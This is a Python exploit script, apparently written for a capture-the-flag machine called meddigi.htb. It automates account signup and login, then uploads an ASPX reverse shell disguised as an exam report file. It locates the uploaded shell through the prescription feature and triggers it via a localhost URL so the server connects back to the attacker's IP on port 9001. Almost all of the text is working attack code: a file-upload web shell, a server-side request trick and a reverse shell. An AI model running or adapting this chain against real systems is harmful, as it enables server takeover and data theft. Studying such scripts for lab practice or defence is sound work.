...
def LaunchPayload(link,cookie):
    print(f"[!] Launching payload to connect to {my_ip} on port 9001")
    headers = { 
    ...
    postData = f"Email=test%40testing.com&Link={link}"
    r = requests.post("https://portal.meddigi.htb/Prescriptions/SendEmail",cookies=cookies,data=postData, verify=False, headers=headers)
 

def GetEquiptmentPage(cookies):
    redirected_response = requests.get("https://portal.meddigi.htb/Prescriptions",cookies=cookies,verify=False)

    cookies.update(redirected_response.cookies)
    return cookies

def SendPrescription(link,cookies):
    headers = { 
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Accept": "*",
        "Accept-Language": "en-US,en;q=0.5",
    ...
    for link in links:
        if ("mystupidshell.aspx" in link.get('href')):
            return link.get('href')

def GetPayloadLink(link,cookies):
    return SendPrescription(link,cookies)

def UploadPayload(cookies):
    print(f"[!] Uploading payload...")
    
    token , c = GetVerfTokenFor("https://portal.meddigi.htb//ExamReport/Upload", cookies)

    print(f"[!] Token: {token}") 
    data = """-----------------------------14469159122173965501532702938
Content-Disposition: form-data; name="PatientNo"

111111
-----------------------------14469159122173965501532702938
...
0001-01-01
-----------------------------14469159122173965501532702938
Content-Disposition: form-data; name="ReportFile"; filename="mystupidshell.aspx"
...
//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
    ...
    {
            String host = "____IP___"; //CHANGE THIS
...
"""
    ...
    data = data.replace("____IP___", my_ip)
    data = data.replace("___TOKEN___", token)
    data= data.replace("\n","\r\n")
    ...
    headers = { 
        ...
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type":"multipart/form-data; boundary=---------------------------14469159122173965501532702938",
        "Origin": "https://portal.meddigi.htb",
    ...
    cookies.update(c)
    r = requests.post("https://portal.meddigi.htb/ExamReport/Upload",cookies=cookies,data=data, verify=False, headers=headers)
    
    return r.cookies
def PortalSignIn(cookies):
    print(f"[!] Logging into Portal")
    r = requests.get("https://portal.meddigi.htb/",cookies=cookies,verify=False)
    soup = BeautifulSoup(r.content, "html.parser")
    buttons = soup.find_all(class_="btn btn-danger")

    for button in buttons:
        if button.text == "Logout":
            print(f"[+] Successfully logged into the Portal")
            return cookies


def GetCookieFromPage(page, cookies):
    r = requests.get("https://meddigi.htb/" + page ,cookies=cookies,verify=False)
    return r.cookies

def GetVerfTokenFor(page_name, cookies=""):
    print(f"[!] Finding Token...")
    r = requests.get(page_name + "/",verify=False, cookies=cookies)
    ...
    verif_token = token.get("value")

    return verif_token, cookies

def SignUp():

    v_token = ""
    cookies = ""
    v_token, cookies = GetVerfTokenFor("https://meddigi.htb/SignUp")

    print(f"[+] Token is { v_token}")
    print(f"[+] Signing up with the username: hax and password: hax12345 ")
    postData = f"Name=hax&LastName=hax&Email=hax%40hax.com&Password=hax12345&ConfirmPassword=hax12345&DateOfBirth=2024-03-20&PhoneNumber=1111111111&Country=USA&Acctype=2&__RequestVerificationToken={v_token}" 

    headers = { 
        "Content-Type":"application/x-www-form-urlencoded"
    }
    r = requests.post("https://meddigi.htb/Signup/SignUp",cookies=cookies,data=postData, verify=False, headers=headers)

    soup = BeautifulSoup(r.content, "html.parser")
    alert = soup.find_all(class_="alert alert-success")

    if (len(alert) > 0):
        successText = alert[0].text
...
def SignIn():
    v_token = ""
    cookies = ""
    token, cookies = GetVerfTokenFor("https://meddigi.htb/SignIn")
    print(f"[+] Token is { token}")
    postData = f"Email=hax%40hax.com&Password=hax12345&__RequestVerificationToken={token}"

    headers = { 
        "Content-Type":"application/x-www-form-urlencoded"
    }

    resp = requests.post("https://meddigi.htb/SignIn/SignIn",data=postData, verify=False, headers=headers, allow_redirects=False)

    cookies.update(resp.cookies)

    redirected_response = requests.get("https://meddigi.htb/Profile",cookies=cookies,verify=False)
    
    soup = BeautifulSoup(redirected_response.content, "html.parser")
    buttons = soup.find_all(class_="btn btn-primary mt-2")

    if (len(buttons) > 0):
        for button in buttons:
            if (button.text == "Add Patient"):
                print(f"[+] Successfully Signed in")
                return cookies
                    
    print(f"[-] Signed in failed")
    return None
if __name__ == "__main__":
    # Disable warning // Don't care this a CTF box
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    if (SignUp() == None):
        print(f"[!] User Might already exist.")
    print(f"[!] Trying to sign in")
    cookies = SignIn()

    PortalSignIn(cookies)
    newCookies = UploadPayload(cookies)
    link = GetPayloadLink("http%3A%2F%2F127.0.0.1%3A8080", cookies)

    print(f"[+] Payload link is {link}")

    LaunchPayload(quote("http://127.0.0.1:8080/" + link),cookies)
